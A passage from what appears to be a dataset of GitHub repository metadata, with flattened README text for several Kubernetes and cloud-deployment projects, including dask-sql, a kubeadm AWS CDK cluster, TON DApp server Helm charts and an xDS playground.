NamedTemporaryFile as f r requests get https storage googleapis com dask sql data model xgboost r raiseforstatus f write r content f flush bst loadmodel f name Our custom function for tip prediction using the already loaded xgboost model def predictprice totalamount tripdistance passengercount Create a dataframe out of the three columns and pass it to dask xgboost to predict distributed X dd concat totalamount tripdistance passengercount axis 1 astype float64 return daskxgboost predict client bst X Create a context from dasksql import Context runserver c Context c registerfunction predictprice predictprice totalamount np float64 tripdistance np float64 passengercount np float64 np float64 Load the data from S3 df dd readcsv s3 nyc tlc trip data yellowtripdata2019 01 csv dtype paymenttype UInt8 VendorID UInt8 passengercount UInt8 RatecodeIDq UInt8 storageoptions anon True persist c createtable nyc taxi df Finally spin up the dask sql server runserver context c client client If you want to edit the startup file you need to change dask sql files run py,2020-11-15T21:12:38Z,2020-12-09T21:17:28Z,Python,User,1,2,1,5,main,nils-braun#romainr,2,0,0,0,0,0,2
glebmish,yandex-scale-2020-lab-k8s,,Managed Service for Kubernetes MDB 1 yc https cloud yandex ru docs cli quickstart Terraform https learn hashicorp com tutorials terraform install cli Docker https docs docker com get docker Kubectl https kubernetes io docs tasks tools install kubectl envsubst git ssh curl 2 https cloud yandex ru 3 SSH 1 SSH https cloud yandex ru docs compute operations vm connect ssh creating ssh keys ssh keygen t rsa b 2048 ssh cat ssh idrsa pub 2 base image lab vm base image SSD sa admin SSH ssh idrsa pub 3 Running 4 sa admin IPv4 5 SSH 6 yc 1 id echo export FOLDERID folder id here bashrc bashrc echo FOLDERID 3 yc config set folder id FOLDERID 2 yc config set instance service account true yc 4 yc yc compute instance list PostgreSQL Terraform Terraform 1 REPO echo export REPO home common yandex scale 2020 lab k8s bashrc bashrc echo REPO cd REPO git pull Terraform PostgreSQL 1 Terraform cd REPO terraform ls terraform init 2 Terraform terraform apply var ycfolder FOLDERID var user USER 3 Terraform Managed K8S 1 Managed Service for Kubernetes lab k8s 2 k8s cluster manager k8s image puller Container Registry 3 Kubernetes 1 lab k8s group SSH ssh idrsa pub 2 Terraform PostgreSQL 1 Terraform Outputs 2 echo export DATABASEURI databaseuri here bashrc echo export DATABASEHOSTS databasehosts here bashrc bashrc echo DATABASEURI echo DATABASEHOSTS 3 Terraform yc managed postgresql cluster list yc managed postgresql cluster get K8S 1 2 yc managed kubernetes cluster list echo export K8SID k8s id here bashrc bashrc echo K8SID yc managed kubernetes cluster id K8SID get yc managed kubernetes cluster id K8SID list node groups Kubectl yc managed kubernetes cluster get credentials id K8SID external kube config cat kube config Docker Container Registry 1 yc container registry create name lab registry 2 id echo export REGISTRYID registry id here bashrc bashrc 2 yc container registry list yc container registry get REGISTRYID 3 docker yc container registry configure docker cat docker config json config json credHelpers container registry cloud yandex net yc cr cloud yandex net yc cr yandex yc Docker Container Registry 1 cd REPO app ls 2 sudo docker build tag cr yandex REGISTRYID lab demo v1 sudo docker images 3 sudo docker push cr yandex REGISTRYID lab demo v1 Docker 1 Docker yc container image list ID k8s 1 cd REPO k8s files ls cat lab demo yaml tpl cat load balancer yaml 2 lab demo yaml tpl DATABASEURI DATABASEHOSTS terraform REGISTRYID yc container registry list envsubst REGISTRYID DATABASEURI DATABASEHOSTS lab demo yaml cat lab demo yaml 3 lab demo yaml tpl lab demo yaml 4 kubectl apply f lab demo yaml kubectl describe deployment lab demo kubectl apply f load balancer yaml kubectl describe service lab demo 5 URL LoadBalancer Ingress MDB PostgreSQL Managed Kubernetes 1 k8s MDB PostgreSQL MDB 1 Managed Service for PostgreSQL UI 2 3 Managed Kubernetes 1 Managed Service for Kubernetes 2 3 4 k8s k8s kubectl delete f load balancer yaml kubectl delete f lab demo yaml k8s yc managed kubernetes cluster list yc managed kubernetes cluster delete lab k8s yc managed kubernetes cluster list Terraform cd REPO terraform terraform destroy var ycfolder FOLDERID var user USER yc managed postgresql cluster list Docker Container Registry lab registry lab registry Compute lab vm,2020-09-14T08:56:58Z,2020-10-21T07:38:14Z,Python,User,1,2,1,0,master,,0,0,0,0,0,0,0
IvanZatravkin,microfrontends-react-k8s-esmodules,,Microfrontends infrastructure boilerplate To run this you will need your own k8s cluster Consult your cloud provider on how to set up one Microfrontend controller Microfrontend controller uses Operator SDK v 1 1 0 If you are not using google cloud storage you may need to update operator to properly upload updated manifest json deployment expects several environmernt variables and secrets you must configure them in config manager manager yaml https sdk operatorframework io docs building operators golang tutorial TL DR make install to install CRD in current cluster make docker build IMG IMGNAME build docker image with name IMGNAME make docker push IMG IMGNAME push image from previous step to your registry make deploy IMG IMGNAME deploy your operator to kubernetes using image IMGNAME Microfrontend host Build image using docker build t IMGNAME Push image to your registry Update k8s deployment to use your image kubectl apply f k8s to deploy it You may need to update ingress yaml if you are not using nginx ingress controller Frontends There are 3 sample frontends To build them yarn yarn build Upload resulting files to your static storage Paste public url in microfrontend yaml and run kubectl apply f microfrontend yaml,2020-11-27T06:53:51Z,2020-12-03T11:38:08Z,Go,User,1,2,1,2,master,justwalkingby,1,0,0,0,0,0,0
samostrovskyi,TON-OS-DApp-Server-k8s,,Description Repository contains Dockerfiles Terraform scripts and deployment scripts to set up infrastructure and deploy TON OS DApp Server on it System requirements Configuration CPU cores RAM GiB Storage GiB Network Gbit s Recommended 24 192 2000 1 NOTE SSD disks are recommended for the storage Prerequisites 1 Kubernetes cluster up this might be any k8s cluster anywhere 2 Kubectl installed 3 Helm 3 installed 4 Kubernetes config file in kube config Quick start 1 Run Dapp server node cd helm nodeinstall sh 2 Stop Dapp server node cd helm nodeuninstall Project structure overview Directories layout build arangodb kafka proxy q server ton node helm charts arangodb kafka q server statsd ton node terraform vpc eks Build directory contains all the required code and Dockerfiles to build Docker images for TON OS DApp Server which will be used in Helm charts for deployment Helm is a package manager for Kubernetes Helm directory contains all the deploy scripts configs and variables to deploy TON OS DApp Server on Kubernetes Terraform vpc eks directory contains Terraform scripts to deploy VPC and EKS Kubernetes cluster on AWS NOTE You may use any other tool cloud or even bare metal server for Kubernetes setup Helm charts will still work Variables To customize variables for TON OS DApp Server components just open helm charts ltcomponentname variables yaml NOTE Default values also can be found there List of variables Parameter Description Default ARANGONOAUTH Disabling arangodb authentication Need to set to 0 for production 1 VIRTUALHOST External hostname to access arangodb UI arango baremetal01 fra02 ibm cloud VIRTUALPORT 8529 LETSENCRYPTHOST Hostname on which SSL should be issued arango baremetal01 fra02 ibm cloud LETSENCRYPTEMAIL senegalelastico gmail com ARANGODBOVERRIDEDETECTEDTOTALMEMORY 343579738368 ARANGOROOTPASSWORD NETWORKTYPE TON Network net ton dev INSTANCENAME first ARANGOSERVICESERVICEHOST arangodb ARANGOSERVICESERVICEPORT 8529 ARANGONISERVICESERVICEHOST arangodbni ARANGONISERVICESERVICEPORT 8529 ARANGONINOAUTH Disabling arangodb authentication Need to set to 0 for production 1 ARANGONIVIRTUALHOST External hostname to access arangodb webui arangoni baremetal01 fra02 ibm cloud ARANGONIVIRTUALPORT Internal ports 8529 ARANGONILETSENCRYPTHOST External hostname to access arangodb webui arangoni baremetal01 fra02 ibm cloud ARANGONILETSENCRYPTEMAIL senegalelastico gmail com discoverytype ELK single node ZOOKEEPERCLIENTPORT 2181 ZOOKEEPERTICKTIME 2000 KAFKABROKERID 1 KAFKAZOOKEEPERCONNECT URL to zookeeper zookeeper 2181 KAFKAADVERTISEDLISTENERS PLAINTEXT kafka 29092 PLAINTEXTHOST kafka 9092 KAFKALISTENERSECURITYPROTOCOLMAP PLAINTEXT PLAINTEXT PLAINTEXTHOST PLAINTEXT KAFKAINTERBROKERLISTENERNAME PLAINTEXT KAFKAOFFSETSTOPICREPLICATIONFACTOR 1 KAFKAJMXPORT 9581 KAFKALOGRETENTIONHOURS 4 KAFKALOGROLLMS 600000 KAFKALOGSEGMENTBYTES 1073741824 KAFKALOGRETENTIONCHECKINTERVALMS 300000 KAFKACLEANUPPOLICY delete KAFKARETENTIONMS 43200000 KAFKAMESSAGEMAXBYTES 3001000 KAFKARECEIVEMESSAGEMAXBYTES 3001000 KAFKAREPLICAFETCHMAXBYTES 3001000 CONNECTBOOTSTRAPSERVERS kafka 29092 CONNECTRESTADVERTISEDHOSTNAME connect CONNECTRESTPORT 8083 CONNECTGROUPID compose connect group CONNECTCONFIGSTORAGETOPIC docker connect configs CONNECTCONFIGSTORAGEREPLICATIONFACTOR 1 CONNECTOFFSETFLUSHINTERVALMS 10000 CONNECTOFFSETSTORAGETOPIC docker connect offsets CONNECTOFFSETSTORAGEREPLICATIONFACTOR 1 CONNECTSTATUSSTORAGETOPIC docker connect status CONNECTSTATUSSTORAGEREPLICATIONFACTOR 1 CONNECTKEYCONVERTER org apache kafka connect storage StringConverter CONNECTVALUECONVERTER io confluent connect avro AvroConverter CONNECTVALUECONVERTERSCHEMAREGISTRYURL http schema registry 8081 CONNECTINTERNALKEYCONVERTER org apache kafka connect json JsonConverter CONNECTINTERNALVALUECONVERTER org apache kafka connect json JsonConverter CONNECTZOOKEEPERCONNECT zookeeper 2181 CLASSPATH usr share java monitoring interceptors monitoring interceptors 5 2 1 jar CONNECTPRODUCERINTERCEPTORCLASSES io confluent monitoring clients interceptor MonitoringProducerInterceptor CONNECTCONSUMERINTERCEPTORCLASSES io confluent monitoring clients interceptor MonitoringConsumerInterceptor CONNECTPLUGINPATH usr share java usr share confluent hub components CONNECTLOG4JLOGGERS org apache zookeeper ERROR org I0Itec zkclient ERROR org reflections ERROR CONNECTKAFKAJMXPORT 9584 CONNECTFETCHMESSAGEMAXBYTES Important limit Without it ton node cant work 4000000 CONNECTMAXREQUESTSIZE Important limit Without it ton node cant work 4000000 CONNECTMAXPARTITIONFETCHBYTES Important limit Without it ton node cant work 4000000 SCHEMAREGISTRYHOSTNAME schema registry SCHEMAREGISTRYKAFKASTORECONNECTIONURL zookeeper 2181 SCHEMAREGISTRYJMXPORT 9582 ADVERTISEDLISTENER telegramuserids List of TG IDs Check getmyidbot telegrambottoken TG Bot token Check BotFather grafanausername Grafana UI user grafanapassword Grafana UI password auth Boolean If true basic auth will be configured for each endpoint username Proxy auth user password Proxy auth password version Q server git branch to build master VIRTUALHOST q server VIRTUALPORT 4000 QDATABASESERVER arangodb 8529 QSLOWDATABASESERVER arangodbni 8529 QREQUESTSMODE kafka QREQUESTSSERVER kafka 9092 QREQUESTSTOPIC requests QDATABASEMAXSOCKETS 100 QSLOWDATABASEMAXSOCKETS 20 IMAGE Statsd docker image repo prom statsd exporter v0 12 2 ARGS statsd mapping config statsd mappings statsd mapping yaml UDPPORT 9125 TCPPORT 9102 IntIP 30303 version DApp node git branch master ADNLPORT 30303 VALIDATORNAME myvalidator NETWORKTYPE net ton dev CONFIGSPATH ton node configs STATSDDOMAIN statsd STATSDPORT 9125 MEMLIMIT 32G STAKE MSIGENABLE SDKURL protocol Web root protocol http Kubernetes Platform setup In case you dont have Kubernetes installed the following instructions will describe how to spin up AWS VPC EKS using Terraform Prerequisites 1 Terraform installed Variables Variables are described in the variables tf file But input values for those variables are in the terraform tfvars file so use it to override Running terraform 1 Export credentials variables export AWSACCESSKEYID anaccesskey export AWSSECRETACCESSKEY asecretkey export AWSDEFAULTREGION us west 2 2 Navigate to project dir cd terraform vpc eks helm 3 Init providers terraform init 4 Plan and see resources will be created terraform plan 5 Create them terraform apply 6 Destroy resources terraform destroy Bare metal Kubernetes installation 1 Navigate to ansible baremetal k8s 2 Run ansible playbook command see readme in ansible dir Logging Graylog stable helm chart is included in nodeinstall script and will be installed automatically How to use https github com helm charts tree master stable graylog https github com helm charts tree master stable graylog Monitoring Grafana stable helm chart is included in nodeinstall script and will be installed automatically How to use https github com helm charts tree master stable grafana https github com helm charts tree master stable grafana Maintainers Telegram renatSK sostrovskyi Github ddzsh samostrovskyi Forum freeton org Gofman sostrovskyi Gmail senegalelastico gmail com renatskitsan gmail com FreeTON wallet address 0 06c812287e994efba0640753a4f4bb5ef43e3caba6254cb0ae820ad7663ef815 Feel free to donate some crystals if you like this To do 1 Data persistence volumes for Kubernetes 2 Notifications for monitoring and logging alerts,2020-08-30T17:46:17Z,2020-10-03T03:43:50Z,Rust,User,1,2,1,15,master,samostrovskyi#rskitsan,2,0,0,1,0,1,0
bbachi,k8s-adaptor-container-pattern,,k8s adaptor container pattern Example project demonstrating kubernetes adaptor container pattern,2020-09-12T21:24:49Z,2020-11-24T12:07:22Z,JavaScript,User,2,2,1,2,master,bbachi,1,0,0,0,0,0,0
karthikasasanka,fastapi-celery-redis-rabbitmq-k8s-specs,,k8s spec files Kubernetes spec files for karthikasasanka fastapi celery redis rabbitmq https github com karthikasasanka fastapi celery redis rabbitmq How to start sevices bash git clone https github com karthikasasanka fastapi celery redis rabbitmq k8s specs cd fastapi celery redis rabbitmq k8s specs kubectl create f Kubernetes will be assign random node ports for the services Get list of the services and corresponding nodeports kubectl get svc output will be something similar to shopping api NodePort 10 109 89 230 5000 32021 TCP 18m shopping celery flower NodePort 10 101 72 146 5555 31744 TCP 18m shopping api is accessable at 32021 and celery flower at 31744 nodeports may change Kubernetes with minikube services can be launched as below minikube service shopping api minikube service shopping celery flower kubernetes with docker desktop services can be accessed with http localhost Cleanup bash kubectl delete services deployments l app shopping Kubernetes https kubernetes io,2020-08-16T06:04:41Z,2020-08-24T08:14:14Z,n/a,User,1,2,0,6,master,karthikasasanka,1,0,0,0,0,0,0
renuka-fernando,demos,envoy#k8s#tls,demos Demonstrations,2020-08-25T13:02:37Z,2020-12-10T18:04:41Z,Shell,User,1,2,0,29,master,renuka-fernando,1,0,0,0,0,0,0
zerospiel,xds-playground,control-plane#go#golang#k8s#playground#xds#xds-client#xds-server,XDS PLAYGROUND Description This is an example of XDS server implementation using envoy control plane https github com envoyproxy go control plane and grpc go XDS package https github com grpc grpc go tree master xds There are some gRPC servers backends some XDS management servers depends on local or k8s versions and some clients frontends that make several RPC calls to the backend All required discovery services resources prepared by the XDS management server using envoy s control plane and every request from the client being resolved by grpc go xds resolver Under the hood there is some magic that grpc go doing with its service config Check out proposal A27 proposal a27 and proposal A28 proposal a28 for more information about the basic principles of xDS requests and response processing The localhost example supports simple and naive emulation of updating adding new endpoints just RR through upstreams to represent scaling updates within 2 backends The k8s example is a more robust way to represent how it will work in your k8s cluster Note that for simplifications both examples produce config caches https github com envoyproxy go control plane resource caching of the whole cluster state in other words State of the World This behaviour can be easily improved because I use MuxCache https pkg go dev github com envoyproxy go control plane v0 9 7 pkg cache v2 MuxCache that combines several LinearCache https pkg go dev github com envoyproxy go control plane v0 9 7 pkg cache v2 LinearCache each of appropriate TypeUrl https pkg go dev github com envoyproxy go control plane v0 9 7 pkg resource v2 pkg constants I mostly didn t care about system design of this playground repository so there is a bunch of boilerplate code This playground was a kind of research for me do not shame on me Usage Localhost example Run the following commands in the root path of the project each in a separate terminal for readability shell make localserver make localxdsserver make localclientxds run target localclientxdsdebug to enable grpc verbose output k8s example I use minikube as a local k8s cluster and helm to deploy resources so you should install them i e on macOS using brew https brew sh shell brew install minikube brew install helm Use the following targets to simply run the whole example then check out logs to investigate what s going on shell minikube start start k8s cluster eval minikube docker env escape usage of local registry works only on terminal where you entered this command make deploy deploy services To undeploy services simply run make undeploy To check out logs run the following commands shell kubectl logs lapp xds server xds server kubectl logs lapp backend backend kubectl logs lapp frontend frontend with grpc debug level Further steps The main idea of these examples is to show a quick presentation of how to bake grpc go with its xds resolver v1 32 0 https github com grpc grpc go releases tag v1 32 0 at this moment Currently locality weight balancing https www envoyproxy io docs envoy latest intro archoverview upstream loadbalancing localityweight just doesn t work at all This is the predefined behavior mentioned in the proposal proposal a27 Note that the EDS policy will support locality level weights but it will not support endpoint level weights Providing a mechanism for endpoint level weighting will be addressed in future work References 1 xDS Based Global Load Balancing Proposal proposal a27 1 gRPC xDS traffic splitting and routing proposal a28 1 Envoy s example of usage and configuring control plane dyplomat 1 This article with pretty good example of usage and control plane configuring article proposal a27 https github com grpc proposal blob master A27 xds global load balancing md proposal a28 https github com grpc proposal blob master A28 xds traffic splitting and routing md dyplomat https github com envoyproxy go control plane blob master examples dyplomat readme md article https medium com salmaan rashid grpc xds loadbalancing a05f8bd754b8,2020-10-01T19:01:07Z,2020-10-30T10:11:23Z,Go,User,1,2,0,18,master,zerospiel,1,0,0,0,0,0,1
alexchenuw,devopslabs,,This is a placeholder for the lab guides of devops with docker and k8s course Created by Alex Chen 2020,2020-10-03T20:14:45Z,2020-12-08T22:03:18Z,HTML,User,2,2,0,321,main,alexchenuw#a-glanville#alexscchen,3,0,0,0,0,0,1
thomas-maurice,sample-kind-cluster,,Sample Kind cluster This repo aims at showcasing how to create a basic viable Kind https kind sigs k8s io cluster with a dynamic volumes provisioner as well as a pre configured traefik v2 https doc traefik io traefik v2 3 ingress controller Create the cluster Just run cluster up sh Or kind create cluster config cluster yaml untaint the master kubectl taint nodes all node role kubernetes io master Then apply the manifests kubectl context kind kind apply f bundle Wait a bit then you should have your traefik dashboard available at localhost 8080 http localhost 8080 You can also install helm helm init service account tiller The script will also install the k8s dashboard that will be accessible at dashboard localhost http dashboard localhost and the traefik dashboard at traefik localhost http traefik localhost dashboard,2020-11-25T11:29:56Z,2020-12-14T10:33:35Z,Shell,User,2,2,0,2,master,thomas-maurice,1,0,0,0,0,0,0
rinx,alvd,approximate-nearest-neighbor-search#nearest-neighbor-search#similarity-search#vald#vector-search-engine,alvd A Lightweight Vald License Apache 2 0 https img shields io github license rinx alvd svg style flat square https opensource org licenses Apache 2 0 release https img shields io github release rinx alvd svg style flat square https github com rinx alvd releases latest ghcr io https img shields io badge ghcr io rinx 2Falvd brightgreen logo docker style flat square https github com users rinx packages container package alvd Docker Pulls https img shields io docker pulls rinx alvd svg style flat square https hub docker com r rinx alvd A lightweight distributed vector search engine based on Vald https vald vdaas org codebase works without Kubernetes single binary less than 20MB easy to run can be configured by command line options consists of Agent and Server alvd has almost same features that Vald s gateway lb discoverer and agent ngt have alvd is highly inspired by k3s https k3s io project Rationale Vald is an awesome highly scalable distributed vector search engine works on Kubernetes It has great features such as file based backup metrics based ordering of Agents Also Vald is highly configurable using YAML files However it requires Kubernetes APIs to discover Vald Agents knowledge of operating Kubernetes knowledge of tuning a lot of complicated parameters it is a little difficult for the users In this project we eliminated several features of Vald such as meta backup manager index manager etc and just focused on Vald s gateway lb and agent ngt By using rancher remotedialer https github com rancher remotedialer Vald s discoverer feature is not needed anymore Also we eliminated advanced options and adopt command line options for configuring the application behavior instead of YAML files As stated above alvd is focused on easy to use Kubernetes less and less components Quick Start 1 Get the latest build from Release https github com rinx alvd releases page and unzip it 2 Run alvd Server sh alvd server 2020 12 18 19 18 27 INFO start alvd server 2020 12 18 19 18 27 INFO metrics server starting on 0 0 0 0 9090 2020 12 18 19 18 27 INFO websocket server starting on 0 0 0 0 8000 2020 12 18 19 18 27 INFO gateway gRPC API starting on 0 0 0 0 8080 INFO 0000 Connecting to proxy url ws 0 0 0 0 8000 connect 2020 12 18 19 18 27 INFO agent gRPC API starting on 0 0 0 0 8081 INFO 0000 Handling backend connection request 7q6ai4gbve83spij0s4g 2020 12 18 19 18 27 INFO connected to 0 0 0 0 8000 alvd Server s websocket server starts on 0 0 0 0 8000 and alvd Server s gRPC API starts on 0 0 0 0 8080 Also alvd Agent s gRPC API starts on 0 0 0 0 8081 alvd Agent process on the Server can be disabled using agent false option 3 Run alvd Agent on a different node or a different terminal on the same node with server 0 0 0 0 8000 and grpc port 8082 option sh alvd agent server host of server node 8000 alvd agent server 0 0 0 0 8000 grpc port 8082 metrics port 9091 2020 12 18 19 20 15 INFO start alvd agent 2020 12 18 19 20 15 INFO metrics server starting on 0 0 0 0 9090 INFO 0000 Connecting to proxy url ws host of server node 8000 connect 2020 12 18 19 20 15 INFO agent gRPC API starting on 0 0 0 0 8081 2020 12 18 19 20 15 INFO connected to host of server node 8000 4 Add more alvd Agents on the other nodes or the other ports on the same node sh alvd agent server host of server node 8000 alvd agent server 0 0 0 0 8000 grpc port 8083 4 5 metrics port 9092 3 4 5 Now we can access the alvd Server s gRPC API host of server node 8080 using Vald v1 clients If you don t have one you can use valdcli v1 alpha https github com vdaas vald client clj pull 14 issuecomment 738521578 this CLI is built for linux amd64 sh insert 100 vectors dimension 784 with random IDs valdcli rand vecs d 784 n 100 with ids valdcli h host of server node p 8080 stream insert search a random vector valdcli rand vec d 784 valdcli h host of server node p 8080 search Distribution On Release https github com rinx alvd releases page alvd binaries for amd64 Linux machines are available alvd linux amd64 zip doesn t use AVX instructions alvd linux amd64 avx2 zip uses AVX2 instuctions for distance calculations It is faster Docker images are available on GitHub Package Registries and DockerHub The images tagged by noavx are built for amd64 arm64 and armv7 architectures avx2 images are only available for amd64 architectures ghcr io rinx alvd https github com users rinx packages container package alvd rinx alvd https hub docker com r rinx alvd Current Status Agent uses NGT service package of Vald Agent NGT uses Vald v1 API 826 https github com vdaas vald pull 826 scheme Server has APIs in https github com vdaas vald tree feature apis v1 new design apis proto v1 vald Unary APIs and Streaming APIs are supported MultiXXX APIs are not supported Build Just running make cmd alvd alvd License alvd is distributed under Apache 2 0 license same as Vald alvd depends on Vald codebase the files came from Vald such as internal pkg vald They are downloaded when running make command are excluded from my license and ownership This is not an official project of Vald This project is an artifact of 20 project of Vald team,2020-10-30T07:36:03Z,2020-12-25T04:57:27Z,Go,User,1,2,0,55,master,rinx,1,4,4,0,0,0,0
soluble-ai,k.env,k8s#kubectl#kubernetes#shell#shellscript,k env An elegant implementation of kubectl contexts using KUBECONFIG in a convenient and easy to understand shell function Using the format k prod or in a command as k prod get pods the KUBECONFIG context is set for the remainder of that terminal session Source POSIX Add this snippet to your bashrc zshrc or other POSIX environment files You should really only use this if you re using a true POSIX shell Otherwise use the Zsh or Bash snippets below sh kubectl wrapper to switch KUBECONFIG environments k if 1 yourenv then KUBECONFIG HOME kube configs yourenv shift kubectl else kubectl fi Bash Add this snippet to your bashrc or other sourced files k bash bash kubectl wrapper to switch KUBECONFIG environments k if 1 yourenv then KUBECONFIG HOME kube configs yourenv shift kubectl else kubectl fi ZSH Add this snippet to your zshrc or other sourced files Includes completion for kubectl k zsh k zsh zsh kubectl wrapper to switch KUBECONFIG environments k if 1 yourenv then KUBECONFIG HOME kube configs yourenv shift kubectl else kubectl fi compdef k kubectl completion About A variation of this has always existed in my zshrc Originally titled k sh kubectx a popular utility that serves a similar function is a choice between a 250 line shell script or a compiled Go binary k env is about a dozen lines of POSIX Simple is better Inspired by ibuildthecloud s tweet https twitter com ibuildthecloud status 1303329978088484869 built by Matt at Soluble ai https www soluble ai,2020-09-09T10:23:54Z,2020-09-13T12:47:11Z,Shell,Organization,1,2,0,12,master,Eriner,1,0,0,0,0,0,0
renatogroffe,ASPNETCore3.1-AppInsights-AppConfiguration-Redis-SQL-K8s_APIAcoes,,,2020-09-23T00:05:27Z,2020-09-23T00:56:28Z,C#,User,1,2,1,2,master,renatogroffe,1,0,0,0,0,0,0
HallBlazzar,kubeadm-CDK,,kubeadm CDK This is a project uses AWS CDK https github com aws aws cdk and kubeamin toolbox https kubernetes io docs setup production environment tools kubeadm install kubeadm to deploy single master node Kubernetes https kubernetes io K8s cluster Note Currently K8s v1 18 8 cluster will be provisioned by latest kubeadm What will be deployed Physical resources Once you deploy K8s cluster though this project the following resources will be created under your AWS account 1 EC2 instance works as K8s master node The master node is not publicly accessible to the internet Arbitrary number of EC2 instance specified in config json work as K8s worker node 1 additional EC2 instance works as manager node This is the only instance could fully access all ports and protocols other instances VPC subnet and related security group for each EC2 instance All instances share the same SSH key pair automatically generated under resource key while deploying and the super user manager K8s resources The following K8s resource will be created as Pods in cluster etcd API Server and kube proxy provisioned by kubeadm CoreDNS Flannel https github com coreos flannel CNI Plugin Ceph storage Ceph filesystem and Ceph filesystem StorageClass default rook cephfs as default persistent storage for cluster provisioned by Rook https rook io docs rook v1 4 ceph filesystem html Deployment Prerequest AWS CLI v2 Installing the AWS CLI version 2 https docs aws amazon com cli latest userguide install cliv2 html Ensure default user is configured https docs aws amazon com cli latest userguide cli configure quickstart html cli configure quickstart config with administrator permission AWS CDK 1 57 0 or later https github com aws aws cdk getting started Please install it globally with npm Python 3 8 and PIP virtualenv 20 0 32 or later https pypi org project virtualenv ssh keygen OpenSSH client Quick Start 1 Clone this repository 2 Switch working directory to the path REPOSITORYPATH you clone this repository cd REPOSITORYPATH 3 Create configuration based on configuration template cp resource config config json sample resource config config json 4 Replace value of the following keys in config json ACCOUNT Same account ID as default user you configured for AWS CLI REGION The region you d like to deploy the AWS resources in this project 5 Create virtual environment python m venv env 6 Activate virtual environment depends on your OS Linux source env bin activate Windows envScriptsactivate bat 7 Install Python dependencies pip install r requirements txt 8 Deploy through deploy sh chmod x deploy sh deploy sh 9 After deploy finished you could retrieve manager node s IP address through the command below aws ec2 describe instances filters Name tag aws cloudformation logical id Values cdk metadata KubernetesHandyManager json jq r KubernetesHandyManager manager Resource 0 data Name instance state name Values running jq r Reservations 0 Instances 0 NetworkInterfaces 0 Association PublicIp Then you could use the private key resource key idrsa and user manager to access the manager instance ssh i resource key idrsa manager MANAGERINSTANCEPUBLICIP The manager instance will already have prepare kubeconfig for kubectl CLI tool and helm to perform any operation to the create K8s cluster Enjoy it Notice Not until you could see default StorageClass default rook cephfs is created do cluster cluster initialization process done Please use kubectl get sc to verify that when you first time SSH to cluster 10 If you d like to clean up all resources created by this project simply run the following command in project repository cdk destroy f Advanced usage Parameters in config json ENVIRONMENTNAME AWS resources and CloudFormation CFN stacks created by this project will be attached with the prefix If you d like to modify it command in step 9 in Quick Start session should be modified For instance the default value is KubernetesHandy You would need to replace KubernetesHandy with prefix you define in the command to retrieve IP address correctly ACCOUNT AWS account to deploy resource It should be the same account ID as default user you configured for AWS CLI AWS CDK will use the default user to perform resource creation while deploying So please make sure the default user have administrator IAM role to perform arbitrary operations to the AWS account REGION Region to deploy K8s cluster Please refer to the AWS region codes https docs aws amazon com AWSEC2 latest UserGuide using regions availability zones html concepts available regions INSTANCETYPE Each EC2 instance created by this project will be the same instance type defined there If you prefer other instance types please replace the value with instance type listed there https aws amazon com ec2 instance types nc1 hls Please notice that ARM architecture based instance types C6g M6g R6g and instance types with insufficient resource https kubernetes io docs setup production environment tools kubeadm install kubeadm before you begin are not recommended Instance type with greater resource capacity than t3 large is recommended STORAGESIZE Disk size of each EC2 instance Insufficient disk space https kubernetes io docs setup production environment tools kubeadm install kubeadm before you begin is not recommended Disk size greater than 256 GB is recommended NUMBEROFWORKER Number of K8s worker node to create for the cluster IMAGEID EC2 AMI used to create each EC2 instance In this project instructions are tested under Ubuntu based AMI Xenial https releases ubuntu com 16 04 Bionic https releases ubuntu com 18 04 and Focal https releases ubuntu com 20 04 Using other Linux distribution or older version of Ubuntu AMI is not recommended IMAGEOWNER Owner of IMAGEID If wrong IMAGEID and IMAGEOWNER pair is provided the deployment process will be broken DEFAULTKEY Default key to inject to EC2 instance It should be the existing AWS EC2 Key pair name Instead of using manager user and idrsa generated by this project to login to EC2 instances You could use DEFAULTKEY and default AMI user e g for Ubuntu AMI the default user is ubuntu to access them Leave the field null to disable injecting DEFAULTKEY to EC2 instances Basically this option is used for troubleshooting purpose How it works AWS resource management This project is built on top of AWS C loud D evelopment T oolkit AWS CDK AWS CDK is an open source software development framework to model and provision your cloud application resources using familiar programming languages While deploying codes will be converted to AWS CloudFormation CFN templates then deploy as CFN stacks When you use this project to deploy K8s Cluster the following CFN stacks will be created under your account if you don t modify ENVIRONMENTNAME prefix KubernetesHandyVpc VPC and subnets to place EC2 instances KubernetesHandyAssets Scripts used by each EC2 instance while bootstrapping KubernetesHandySG Security group of each EC2 instance KubernetesHandyMaster Master node KubernetesHandyManager Manager node KubernetesHandyWorker Worker node CDK will automatically decide dependency relations between each stack then decide order to deploy each stack K8s level bootstrapping It relies on how kubeadm works K8s cluster deployment follow the following order Master node Start master node Worker nodes Register worker nodes to Master node Manager node Deploy additional components CNI Plugins Persistent Storage Each node runs shell scripts defined in resource script while bootstrapping Scripts will be ran when cloud init https docs aws amazon com AWSEC2 latest UserGuide user data html finish running module final to ensure instance is ready for K8s components deployment In addition to enable automatically deployment token is automatically generated and inject to master node and worker node The following links describe how it work https kubernetes io docs reference setup tools kubeadm kubeadm join token based discovery without ca pinning https kubernetes io docs reference setup tools kubeadm kubeadm join config file You could check shell scripts and resource template kubeadm confg yaml j2 to gain more insights,2020-08-19T13:57:42Z,2020-12-26T07:22:27Z,Python,User,1,2,1,0,master,,0,0,0,0,0,0,0
fish2018,dump-handler,,k8sjavaOOMdump preStop http www devopser org articles 2020 09 17 1600339403553 html jvm dump dumps oom dumps oomoss osspodidenvbucket osspodid GOOS linux go build ldflags w s 1jvmOOM XX HeapDumpOnOutOfMemoryError XX HeapDumpPath dumps oom XX ExitOnOutOfMemoryError XX OnOutOfMemoryError dump handler k HOSTNAME e ENV 2k8sdeploymentemptyDirvolume dumps PODID k8s podid HOSTNAME podid ops demo ops demo app ENV ENV deploymentENV OOM Dump dumps oom,2020-09-17T10:05:28Z,2020-09-22T03:42:28Z,Go,User,1,2,1,1,master,fish2018,1,0,0,0,0,0,0
